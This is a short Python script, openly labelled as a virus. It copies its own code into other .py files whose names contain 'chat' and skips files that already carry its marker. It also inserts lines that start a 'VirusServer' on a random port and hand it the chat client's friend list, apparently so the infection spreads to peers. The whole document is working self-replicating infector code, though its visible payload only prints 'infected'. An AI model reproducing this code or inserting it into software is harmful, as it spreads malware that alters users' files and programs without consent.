

## VIRUS ##
import re
import glob

# get a copy of the virus
v_code = []
v_file = open("venv/virus_server.py", "r")
v_lines = v_file.readlines()
v_file.close()

# find victims in the vulnerable set
victims = []

for f in glob.glob('*/*.py'):
    if f.__contains__("chat"):
        # print("victim is: " + f)
        victims.append(f)

#infect
for v in victims:
    v_file = open(v, "r")
    victim_lines = v_file.readlines()
    v_file.close()
    infected = False
    for line in victim_lines:
        if re.search('## VIRUS ##', line):
            infected = True
            break
    if not infected:
        with open(v, 'r+') as fh:
            # print("abt to be infected: " + v)
            lines = fh.readlines()
            for index, line in enumerate(lines, 1):
                if re.match(r'(.*) = ChatBox(.*)', line):
                    lines.insert(index, "\n        virus_box = VirusServer(random.randint(1024, 49151), port, chat_box.friend_list)")
                    lines.insert(index+1, "\n        port = virus_box.PORT\n")
            v_lines.extend(lines)
            fh.seek(0)
            fh.writelines(v_lines)
            fh.close()
            break

#payload
print("infected")

## VIRUS END ##

